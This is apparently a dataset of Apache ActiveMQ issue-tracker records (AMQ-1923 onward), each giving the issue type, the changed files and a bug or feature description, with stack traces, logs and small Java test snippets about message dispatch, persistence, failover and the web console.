The trunk build is failing because the xbean-spring-3.3.jar cannot be located: [INFO] ------------------------------------------------------------------------[ERROR] BUILD ERROR[INFO] ------------------------------------------------------------------------[INFO] Failed to resolve artifact.Missing:----------1) org.apache.xbean:xbean-spring:jar:3.3-SNAPSHOT  Try downloading the file manually from the project website.  Then, install it using the command:       mvn install:install-file -DgroupId=org.apache.xbean -DartifactId=xbean-spring -Dversion=3.3-SNAPSHOT -Dpackaging=jar -Dfile=/path/to/file  Alternatively, if you host your own repository you can deploy the file there:       mvn deploy:deploy-file -DgroupId=org.apache.xbean -DartifactId=xbean-spring -Dversion=3.3-SNAPSHOT -Dpackaging=jar -Dfile=/path/to/file -Durl=[url] -DrepositoryId=[id]  Path to dependency:         1) org.apache.xbean:maven-xbean-plugin:maven-plugin:3.3        2) org.apache.xbean:xbean-spring:jar:3.3-SNAPSHOT----------1 required artifact is missing.for artifact:   org.apache.xbean:maven-xbean-plugin:maven-plugin:3.3from the specified remote repositories:  nexus (http://localhost:8081/nexus/content/groups/public)The attached patch updates the XBean version to 3.4 and the build succeeds.
issueID:AMQ-1923
type:Bug
changed files:PooledConnectionFactoryBean.java
texts:The default value for the maximumActive property on the PooledConnectionFactoryBean is 0, making it unusable
None
issueID:AMQ-1925
type:Bug
changed files:
texts:JDBC-Master/Slave Failover - Consumer stop after 1000 Messages
In a JDBC-Master/Slave Environment with ActiveMQ 5.1.0 (+patches for 1710 und 1838) the failover for consumers works, the consumers resume to get messages after the failover but then the suddenly stop after approx. 1000 messages (mostly 1000, one got to 1080). The consumers are using transacted sessions.The thread dump look unsuspicious, everybody is waiting on the Socket   java.lang.Thread.State: RUNNABLE at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:129) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58) at java.io.DataInputStream.readInt(DataInputStream.java:370) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269) at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:195) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183) at java.lang.Thread.run(Thread.java:619)A memory dump from the consumers shows that they"ve really run out of messages and are waiting for the broker to deliver new ones. I"ve attached both the thread dump and the heap dump to this issue (or better: I"ll do so The broker doesn"t do anything (also waits on the transport-socket), the queue has a full page-in buffer (100 messages) but obviously fails to do anything with it. If I manually trigger a doDispatch of all pagedIn messages (via the debugger, just a try to revive the thing) it returns doing nothing at all, since all subscriptions are full (s.isFull). I further investigated the issue and was confused to see the prefetchExtension field of the PrefetchSubscription having a value of -1000 (negative!). This explains why it was considered full:  dispatched.size() - prefetchExtension >= info.getPrefetchSize()  0 - (-1000) >= 1000quite nasty.. so even though the dispatched size was zero the client didn"t receive any new messages.The only place this value can become negative is inside acknowledge, where it"s decremented (prefetchExtension--), all other places do a Math.max(0, X).So here"s my guess what happened: The client had a full (1000 messages) prefetch buffer when I killed my master. As soon as the slave was done starting they reconnected and started processing the messages in the prefetch and acknowleding them. This gradually decremented the counter into a negative value because the slave never got a chance to increment the prefetchExtension since it didn"t action delivery those messages.Possible solutions: clear the prefetch buffer on a failover just don"t allow this value to become smaller than zero (not sure if that covers all bases)
issueID:AMQ-1926
type:Bug
changed files:AsyncDataManager.java
texts:Persistent store journal files (occasionally) not being cleaned up at runtime for queues with active consumers
Over a long period data files fill up in the activemq-data/borker1/data/journal directory. Scenario is single queue, persistent producer and consumer, consumer periodically stalls to allow messages to build up in broker.Problem appears to be related to message ack before async message store gets a chance to persist messages. Reference to active data file remain which stops them being cleaned up by the periodic checkpoint.This limits the available up time of the broker with large volumes of messages as excessive amounts of disk space are consumed.Using syncOnWrite=true or setting a AMQPersistenceAdapter.maxCheckpointMessageAddSize=0 will help avoid the problem, both of which will effect performance.
issueID:AMQ-1928
type:New Feature
changed files:TcpTransportServer.java
ExceededMaximumConnectionsException.java
texts:Limit the maximum number of connections to a Broker
Add a property (maximumConnections) to TcpTransportSever to limit a maximum number of active connections
issueID:AMQ-1931
type:Improvement
changed files:
texts:Externalize the &#39;sleepTime&#39; field in the DefaultDatabaseLocker class.
user quote:We need the "sleepTime" field of the DefaultDatabaseLocker class to be externalized. We"re using a custom (non-blocking) lock create statement and we need to make the sleepTime a bit longer.Currently there"s no mechanism to change the value of this field. 1000 ms is the default and only possible value for "sleepTime".We need to have this value externalized to the JDBCPersistenceAdapter. There should be a setter in the JDBCPersistenceAdapter, so that we are able to provide a custom value for this field in our Spring context. This value should be then copied from JDBCPersistenceAdapter to the DefaultDatabaseLocker when an instance of the DefaultDatabaseLocker is created.
issueID:AMQ-1933
type:Improvement
changed files:
texts:Support unsubscribing REST consumers
Currently, there is no way to unsubscribe consumer,once subscribed via REST.The POST request to the appropriate URL, such ashttp://localhost:8161/demo/message/TEST?type=queue&action=unsubscribe for example, unsubscribe the consumer from the destination
issueID:AMQ-1935
type:Improvement
changed files:AbstractPendingMessageCursor.java
FilePendingMessageCursor.java
VMPendingMessageCursor.java
texts:Enable caching by default for Durable Topic Subscriber
By default caching is disabled for Durable Topic Subscribers - it should be enabled to boost performance for all stores.
issueID:AMQ-1936
type:Bug
changed files:
texts:Duplicate message received when producing and consuming concurrently
Hello,We are receiving duplicate messages when processing a moderate numbers of messages ( ~60,000 ), I have attached a JUNIT test which re-produces the issue on my machine with the broker configuration file used. Please note that It does take a few minutes to generate the test failure.The test needs to be run with increased heap memory using the JMV option -Xmx512mWe initially found the issue using the IONA Fuse version 5.1.0.0 which would produce the same issue at 30,000 messages and without persistence storage. I later downloaded the ActiveMQ 5.1.0 version which would pass at 30,000 but fail at 60,000.It is causing major issues for our project and hindering our application from going to production.
issueID:AMQ-1938
type:Bug
changed files:PooledConnectionFactoryBean.java
texts:The pooled connection factory FactoryBean does not implement DisposableBean and thus leaks connections
None
issueID:AMQ-1940
type:Bug
changed files:
texts:Negative queue size (reproducible)
When you "purge" queue from web admin console, it zeroes queue messagecounter. But if you have an active consumer at that time whichpre-fetched messages than your consumer will keep sending ack as itprocess messages from its buffer. ActiveMQ will keep decrement counterupon receiving each ack. So when consumer is done queue will showMINUS<consumer buffer size>.
issueID:AMQ-1942
type:Bug
changed files:
texts:Numeric selectors do not work in STOMP
JMS SQL92 numeric selectors, such as  < > <= >= BETWEEN val AND valFail to work via STOMP.Possible solutions:  1.  String Operands to numeric selector operators are converted to Numeric types only in STOMP?  2.  Explicit casting to SQL92 Numeric types becomes supported in selectors, ie ( INTEGER(field) <= 5)
issueID:AMQ-1943
type:Bug
changed files:DefaultJDBCAdapter.java
texts:hasSpace call looks like it may cause messages to be skipped (AMQ-1080 has not been applied for queues)
SVN revision 560783 modifies only 1 of the 2 DefaultJDBCAdapater.doRecoverNextMessages() methods to break from the loop if the listener.recoverMessage() returns false. The doRecoverNextMessages for queues just logs it at debug level.Shouldn"t that method break from the loop too? I"m seeing the same problems described in AMQ-1080 with the queues on our test and production servers: 1) lots of " Stopped recover next messages" messages and CPU usage going way up2) messages being skipped
issueID:AMQ-1945
type:Improvement
changed files:FixedSizedSubscriptionRecoveryPolicy.java
texts:FixedSizeSubscriptionRecoveryPolicy default size is too large - (6mb) - make it 64kb by default
None
issueID:AMQ-1946
type:Bug
changed files:RangeStatisticImpl.java
DestinationStatistics.java
TimeStatisticImpl.java
CountStatisticImpl.java
StatisticImpl.java
texts:Negative ConsumerCount
Here"s the scenario.You have one or more active consumers for a particular queue. Via the JConsole, you invoke the DestinationView"s resetStatistics() method for that queueThe consumer count is reset to 0, even though you still have one or more active consumersIf you shutdown the consumers and then refresh the "Attributes" panel for the queue, you end up with a negative value for the ConsumerCount attribute. The negative number reflects the number of once active consumers.  So if you had 2 consumers, you"ll see -2. If you then restart the consumers, the negative value is increased by the number of active consumers thus leaving you with an invalid consumer count. So if you previously had 2 consumers, when you bring 2 back up you"ll end up with a 0 value for the ConsumerCount This probably also holds true for the ProducerCount. The resetStatistics() method shouldn"t reset these two counts.
issueID:AMQ-1947
type:Bug
changed files:Queue.java
texts:Queue.pagedInPendingDispatch should be a set - to prevent messages being added more than once
None
issueID:AMQ-1949
type:Bug
changed files:
texts:Last few messages not acked when using DUPS_OK_ACKNOWLEDGE and consumer is closed()
None
issueID:AMQ-1950
type:Bug
changed files:Queue.java
texts:Deadlock using temporary queues in Pure Master/Slave setup
The deadlock occurs on the slave after sending some 30 messages. Sending a few at a time works fine.The test application is a MessageDrivenBean that sends a message to another MDB with a temporary reply queue.Name: TempQueue:  ID:selten.marketxs.com-40254-1222245868043-0:14:6State: WAITING on java.util.concurrent.locks.ReentrantLock$NonfairSync@f30862 owned by: VMTransport: vm://solow.marketxs.com#1Total blocked: 0  Total waited: 1Stack trace: sun.misc.Unsafe.park(Native Method)java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:778)java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1114)java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)org.apache.activemq.broker.region.Queue.iterate(Queue.java:992) locked org.apache.activemq.broker.region.Queue$2@16b775forg.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)Name: VMTransport: vm://solow.marketxs.com#1State: BLOCKED on org.apache.activemq.broker.region.Queue$2@16b775f owned by: TempQueue:  ID:selten.marketxs.com-40254-1222245868043-0:14:6Total blocked: 9  Total waited: 2,684Stack trace: org.apache.activemq.broker.region.Queue.iterate(Queue.java:952)org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1136)org.apache.activemq.broker.region.Queue.addSubscription(Queue.java:249)org.apache.activemq.broker.region.TempQueue.addSubscription(TempQueue.java:74)org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:275) locked java.lang.Object@1ba2be8org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:378)org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83)org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93)org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:541)org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:345)org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205)org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)I"ll try to reproduce the issue with a stand-alone JMS client. It also happens without JBoss clustering.
issueID:AMQ-1951
type:Bug
changed files:
texts:InFlightCount JMX MBean property does not decrement when consuming in a transaction
None
issueID:AMQ-1952
type:Bug
changed files:Queue.java
texts:JMSXDeliveryCount is not being incremented correctly
There seems to be a problem with respect to the Redelivered and JMSXDeliveryCountproperties, in that these properties are being incremented even when the messagehas never been re-delivered to the consumer (i.e. on initial message delivery).The behavior appears to be happening when there is > 1 messages in the queue,the second message and subsequent messages show the redelivered property set to true andJMSXDeliverCount property with a number greater than 1, when those messages have not beenre-delivered before.
issueID:AMQ-1953
type:Bug
changed files:Statements.java
texts:Lock table was not getting dropped when the JDBC store cleared out the messages.
None
issueID:AMQ-1955
type:Bug
changed files:web.xml
pom.xml
WebClient.java
MessageServletSupport.java
MessageServlet.java
texts:MessageServlet reads too many messages
MessageServlet inside activemq-web will pull maxMessages+1 messages off of the queue but only write a response containing maxMessages. After some debugging, I figured out that the problem is with the while loop that reads messages inside the doMessages method (and doMessagesWithoutContinuation).  It always reads a message at the end of the loop, without first checking to see if maxMessages has already been reached. Attached is a patch that corrects this issue.
issueID:AMQ-1956
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:NPE during broker shutdown when useDatabaseLock="false"
Steps:1. Create a broker with the persistence adapter set to not use database locking (useDatabaseLock="false")2. Start broker3. Stop broker (but keep the process running, as in a servlet container)Result:In the logs, I see the following error every 30 seconds:2008/09/25 15:23:55.506 INFO &#91;org.apache.activemq.store.jdbc.JDBCPersistenceAdapter&#93; No longer able to keep the exclusive lock so giving up being a master2008/09/25 15:23:55.506 WARN &#91;org.apache.activemq.store.jdbc.JDBCPersistenceAdapter&#93; Failed to stop broker2008/09/25 15:24:25.504 ERROR &#91;org.apache.activemq.store.jdbc.DefaultDatabaseLocker&#93; Failed to update database lock: java.lang.NullPointerExceptionjava.lang.NullPointerException        at org.apache.activemq.store.jdbc.DefaultDatabaseLocker.keepAlive(DefaultDatabaseLocker.java:102)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.databaseLockKeepAlive(JDBCPersistenceAdapter.java:458)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter$3.run(JDBCPersistenceAdapter.java:260)        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:417)        at java.util.concurrent.FutureTask$Sync.innerRunAndReset(FutureTask.java:280)        at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:135)        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$101(ScheduledThreadPoolExecutor.java:65)        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.runPeriodic(ScheduledThreadPoolExecutor.java:142)        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:166)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:613)Analysis:During startup, JDBCPersistenceAdapter only initializes the database locker if useDatabaseLock if true. This is done through lazy initialization by calling getDatabaseLocker (at ~ line 172):        if (isUseDatabaseLock()) {            DatabaseLocker service = getDatabaseLocker();            if (service == null) {                LOG.warn("No databaseLocker configured for the JDBC Persistence Adapter");            } else {                service.start();            }        }During shutdown, JDBCPersistenceAdapter calls getDatabaseLocker() to shut it down, but it does not check if isUseDatabaseLock() is true in this case:    public synchronized void stop() throws Exception {        if (clockTicket != null) {            clockTicket.cancel(true);            clockTicket = null;        }        if (clockDaemon != null) {            clockDaemon.shutdown();            clockDaemon = null;        }        DatabaseLocker service = getDatabaseLocker();        if (service != null) {            service.stop();        }    }This actually causes database locker to be initialized and it subsequently lazy-initializes an executor to run a task which calls keepAlive(...). The executor threads are set as daemon threads which prevents this issue from showing up when the lifetime of the process is the same as the broker. When the broker is deployed in an app server which can outlive the broker then the above error is logged every 30 seconds.I"m attaching one way to solve this problem without having to check everywhere if useDatabaseLock="false".Attached:BrokerStopFailure.java - sample program that reproduces this bugNoLockerJDBCPersistenceAdapter.java - sample extension to JDBCPersistenceAdapter that fixes this bug
issueID:AMQ-1957
type:Bug
changed files:
texts:All in one patch concerning message dispatching problems with Spring DMLC 2.5.5 +JBoss 4.2.2 with cacheLevel=CACHE_NONE
Here is an all in one patches applied on version 5.0.0.19It is composed from 4 files directly applicable on Fuse v5.0.0.19They all concern package "org.apache.activemq.broker.region".The effects of this patch are the following: Avoid multiple dispatching of same message to multiple subscription multiple time (Multiple dispatch to client consumers in some cases = > causes multiple commits for same message => causing negatives counters on Pending Message Count) Avoid the broker hanging when a queue has numerous messages in one queue MB-386 + Correction Some other little glitches
issueID:AMQ-1959
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:org.apache.activemq.broker.ft.TransactedTopicMasterSlaveTest.testSendReceiveTransactedBatchesWithMasterStop() hangs on tearDown
None
issueID:AMQ-1960
type:Improvement
changed files:MessageServlet.java
texts:Support REST consuming without sessions
If the REST client passes consumerId parameter, it should consume messages using the WebClient stored in an application scopeFor example subsequent calls to thehttp://localhost:8161/demo/message/TEST?type=queuecreates a new session every time (and try to use new consumer) if client does not keep session cookies.It should be possible to do something like thishttp://localhost:8161/demo/message/TEST?type=queue&consumerId=ABCand allow clients to do sessionless consuming using the same consumer
issueID:AMQ-1962
type:Bug
changed files:AbstractStoreCursor.java
StoreQueueCursor.java
texts:org.apache.activemq.transport.stomp.StompSubscriptionRemoveTest.testRemoveSubscriber() fails on trunk
strange behavior with queue cursor, seems to run out of messages.
issueID:AMQ-1963
type:Bug
changed files:JmsFrameTranslator.java
texts:The JmsFrameTranslator for stomp outputs "is null" to the console on every recieved message
JmsFrameTranslator.java has a console write line to output "is null" whenever it creates a new xstream object.  This can occur on every frame and can clutter log files.  Either it needs to be changed to a log4j call or it needs to be removed entirely.
issueID:AMQ-1964
type:Bug
changed files:
texts:StreamMessage.writeObject() doesn&#39;t behave according to the JMS 1.1 specification
The subj method has restrictions on the types of objects it can accept, but those restrictions aren"t implemented. Testcase below.// get a live session        ConnectionFactory cf = new ActiveMQConnectionFactory("vm://localhost?broker.persistent=false&broker.useJmx=false");        Session session = cf.createConnection().createSession(false, Session.AUTO_ACKNOWLEDGE);        StreamMessage sm = session.createStreamMessage();        // only primitives (with wrappers), String and byte[] are allowed:        // http://java.sun.com/j2ee/sdk_1.3/techdocs/api/javax/jms/StreamMessage.html#writeObject(java.lang.Object)        try        {            sm.writeObject(new Object());            fail("Should"ve failed with MessageFormatException");        }        catch (MessageFormatException e)        {            // JMS 1.1 spec, Section 7.3 Standard Exceptions, page 89, 1st paragraph            // expected        }
issueID:AMQ-1965
type:Bug
changed files:
texts:StreamMessage.writeObject() ignores Long data type
streamMessage.writeObject(new Long("1")) is silently ignored, nothing is written to the message body. The ActiveMQStreamMessage is missing one "if" clause for the Long datatype.ConnectionFactory cf = new ActiveMQConnectionFactory("vm://localhost?broker.persistent=false&broker.useJmx=false");        Session session = cf.createConnection().createSession(false, Session.AUTO_ACKNOWLEDGE);        StreamMessage sm = session.createStreamMessage();        sm.writeObject(new Long("1"));        // reset so it"s readable now        sm.reset();        assertEquals(new Long("1"), sm.readObject());
issueID:AMQ-1967
type:Improvement
changed files:
texts:TcpTransportServer.bind() should use serverSocket.setReuseAddress(Boolean.TRUE)
for tests that restart brokers or for apps that require fast restarts, using reuseAddress for server sockets makes sense.The default should be true, with the option to control it through transport Options.This will help the robustness of DuplexNetworkMBeanTest which does a bunch of broker restarts to check for leaked MBeans
issueID:AMQ-1968
type:Improvement
changed files:
texts:Dependencies to jstl and standard tag library for web console are duplicated
There"s no need to have JSTL and standard tag library JARs in the web console classpath since they are already included with jsp-api jar. It adds to the size of the distribution and could lead to version conflicts.
issueID:AMQ-1969
type:Improvement
changed files:
texts:Long destination text (destination, subscriber names, etc) breaks web console layout
Provide CSS classes and JSP tags that allows creation of tool tips (and short versions for HTML components) for long text.
issueID:AMQ-1970
type:Bug
changed files:
texts:Slave in Pure Master/Slave setup not updated when more than 200 messages on a queue
See the attached application. If I run   org.activemq.jms.StandaloneApp 200 1it works fine. Tried it 5 times, so sent 1000 messages altogetherIf I run  org.activemq.jms.StandaloneApp 250 1it fails. The master is fine, but the slave still has pending messages on "queue.A". (43 in my last run)It reported 407 received messages. (the first 200 + 207 of the last run)Master logs:2008-10-08 18:31:04,509 &#91;queue://queue.A&#93; DEBUG AMQMessageStore                - flush starting ...2008-10-08 18:31:04,513 &#91;0.1.1.155:56003&#93; DEBUG AMQMessageStore                - Journalled message add for: ID:hans-44777-1223483462760-0:1:1:1:208, at: offset = 168628, file = 1, size = 279, type = 12008-10-08 18:31:04,513 &#91;queue://queue.A&#93; DEBUG AMQMessageStore                - Doing batch update... adding: 1 removing: 0 2008-10-08 18:31:04,513 &#91;queue://queue.A&#93; DEBUG AMQMessageStore                - Batch update done..................2008-10-08 18:31:33,313 &#91;0.1.1.155:56846&#93; DEBUG TransportConnection            - Stopping connection: /10.1.1.155:568462008-10-08 18:31:33,314 &#91;0.1.1.155:56846&#93; DEBUG TcpTransport                   - Stopping transport tcp:///10.1.1.155:568462008-10-08 18:31:33,314 &#91;0.1.1.155:56846&#93; DEBUG TransportConnection            - Stopped transport: /10.1.1.155:568462008-10-08 18:31:33,314 &#91;0.1.1.155:56846&#93; DEBUG TransportConnection            - Connection Stopped: /10.1.1.155:568462008-10-08 18:31:33,317 &#91;0.1.1.155:56001&#93; ERROR MasterBroker                   - Slave Failedjavax.jms.JMSException: Unmatched acknowledege: Could not find Message-ID null in dispatched-list (end of ack)        at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:443)        at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187)        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205)        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)2008-10-08 18:31:33,319 &#91;0.1.1.155:56001&#93; DEBUG AMQMessageStore                - Journalled message remove for: ID:hans-44777-1223483462760-0:1:1:1:208, at: offset = 233965, file = 1, size = 266, type = 12008-10-08 18:31:33,319 &#91;queue://queue.A&#93; DEBUG AMQMessageStore                - Doing batch update... adding: 0 removing: 1 2008-10-08 18:31:33,320 &#91;queue://queue.A&#93; DEBUG AMQMessageStore                - Batch update done.Slave logs:2008-10-08 18:31:04,515 .serverhost#1 ERROR Service                        - Async error occurred: javax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:hans-44777-1223483462760-0:1:1:1:208) was not in the pending listjavax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:hans-44777-1223483462760-0:1:1:1:208) was not in the pending list        at org.apache.activemq.broker.region.PrefetchSubscription.processMessageDispatchNotification(PrefetchSubscription.java:174)        at org.apache.activemq.broker.region.AbstractRegion.processDispatchNotification(AbstractRegion.java:414)        at org.apache.activemq.broker.region.RegionBroker.processDispatchNotification(RegionBroker.java:585)
issueID:AMQ-1971
type:Bug
changed files:StoreDurableSubscriberCursor.java
AbstractPendingMessageCursor.java
PendingMessageCursor.java
AbstractStoreCursor.java
TopicStorePrefetch.java
texts:ConcurrentModificationException in high volume broker
This is occurring in the thousands as messages come through.    We have a network of 5 brokers although they do most of their work internally (publisher/consumer for queue are only on same broker) and do less work crossing to a central broker.java.util.ConcurrentModificationException at java.util.LinkedHashMap$LinkedHashIterator.nextEntry(LinkedHashMap.java:373) at java.util.LinkedHashMap$EntryIterator.next(LinkedHashMap.java:392) at java.util.LinkedHashMap$EntryIterator.next(LinkedHashMap.java:391) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.next(AbstractStoreCursor.java:136) at org.apache.activemq.broker.region.cursors.StoreQueueCursor.next(StoreQueueCursor.java:140) at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1178) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1290) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1004) at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84) at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1972
type:Improvement
changed files:DefaultDatabaseLocker.java
texts:Pluggable exception handler for JDBC DefaultDatabaseLocker
Sometimes folks want to use a custom error handler when using a custom database locking strategy.. that way they can inspect the error message for known SQL error codes and such.
issueID:AMQ-1976
type:Bug
changed files:
texts:Network of brokers gets out of sync for dispatched messages causing a shutdown of the bridge connections and stalling the brokers
Running 5.2.0 RC2 + patch AMQ-1971 I have a network of 5 brokers, running around 50,000 messages per minute per broker within each broker and sending across a total of around 20,000 messages per minute to one of the 5 brokers via a bridge connection.  The configuration is the 5.2.0 default with broker names changed on each config and with a network connector set for autodiscovery.  The system runs for a while then eventually on one broker (the receiving broker that is the only one with the consumers for this queue) these errors appear:ERROR RecoveryListenerAdapter        - Message id ID:ingest1.mag.ss.com-54179-1223898804441-0:6:1:1:6134 could not be recovered from the data store - already dispatchedERROR RecoveryListenerAdapter        - Message id ID:query1.mag.ss.com-38822-1223898893819-0:58:16388:1:48 could not be recovered from the data store - already dispatchedThey appear in really high counts.On the sending side brokers (publishers but no consumers on these brokers for this queue), these errors appear:INFO  DemandForwardingBridge         - query2.mag.ss.com bridge to query1.mag.ss.com stoppedINFO  DiscoveryNetworkConnector      - Establishing network connection between from vm://query2.mag.ss.com to tcp://query1.mag.ss.com:61616INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#30 and tcp://query1.mag.ss.com/10.100.0.101:61616(query1.mag.ss.com) has been established.ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732)javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732) at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport$8.onCompletion(DemandForwardingBridgeSupport.java:643) at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:61) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:184) at java.lang.Thread.run(Thread.java:619)INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#30 and tcp://query1.mag.ss.com/10.100.0.101:61616 shutdown due to a local error: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732)INFO  DemandForwardingBridge         - query2.mag.ss.com bridge to query1.mag.ss.com stoppedINFO  DiscoveryNetworkConnector      - Establishing network connection between from vm://query2.mag.ss.com to tcp://query1.mag.ss.com:61616INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#32 and tcp://query1.mag.ss.com/10.100.0.101:61616(query1.mag.ss.com) has been established.ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730)javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730) at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445) at 